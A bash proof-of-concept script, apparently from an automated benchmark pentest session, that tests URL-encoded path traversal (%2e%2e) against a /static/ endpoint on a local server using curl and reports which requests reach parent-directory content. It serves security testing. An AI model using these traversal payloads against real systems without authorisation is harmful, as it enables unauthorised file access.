#!/bin/bash
# POC: Demonstrates URL-encoded path traversal vulnerability using %2e%2e sequences to bypass directory restrictions in /static/ endpoint
# Target: ./repo
# Created: 2025-11-04T19:27:34.407Z
# Session: benchmark-XBEN-015-24-mhkyd2u2

# URL-Encoded Path Traversal POC
# Tests if URL-encoded sequences (%2e%2e) can bypass path traversal filters

TARGET="${1:-http://localhost:5000}"
STATIC_ENDPOINT="/static/"

echo "=========================================="
echo "URL-Encoded Path Traversal POC"
echo "=========================================="
echo "Target: $TARGET"
echo ""

# Test 1: Plain path traversal (baseline)
echo "[Test 1] Plain path traversal: /static/../"
RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET/static/../")
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)
echo "HTTP Status: $HTTP_CODE"
if echo "$BODY" | grep -q "html\|HTML"; then
    echo "✓ Successfully accessed parent directory (home page detected)"
else
    echo "✗ Could not access parent directory"
fi
echo ""

# Test 2: URL-encoded path traversal
echo "[Test 2] URL-encoded path traversal: /static/%2e%2e/"
RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET/static/%2e%2e/")
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)
echo "HTTP Status: $HTTP_CODE"
if echo "$BODY" | grep -q "html\|HTML"; then
    echo "✓ Successfully accessed parent directory via URL-encoded sequence (home page detected)"
else
    echo "✗ Could not access parent directory via URL-encoded sequence"
fi
echo ""

# Test 3: URL-encoded path traversal to access static file from parent
echo "[Test 3] URL-encoded traversal to access static CSS: /static/%2e%2e/static/css/style.css"
RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET/static/%2e%2e/static/css/style.css")
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)
echo "HTTP Status: $HTTP_CODE"
if echo "$BODY" | grep -q "css\|CSS\|color\|font"; then
    echo "✓ Successfully accessed file via URL-encoded traversal (CSS content detected)"
else
    echo "✗ Could not access file via URL-encoded traversal"
fi
echo ""

# Test 4: Double-encoded sequences (should fail)
echo "[Test 4] Double-encoded path traversal: /static/%252e%252e/ (should fail)"
RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET/static/%252e%252e/")
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)
echo "HTTP Status: $HTTP_CODE"
if [ "$HTTP_CODE" = "404" ]; then
    echo "✓ Correctly blocked double-encoded sequence (404 as expected)"
else
    echo "✗ Unexpected response to double-encoded sequence"
fi
echo ""

echo "=========================================="
echo "POC Complete"
echo "=========================================="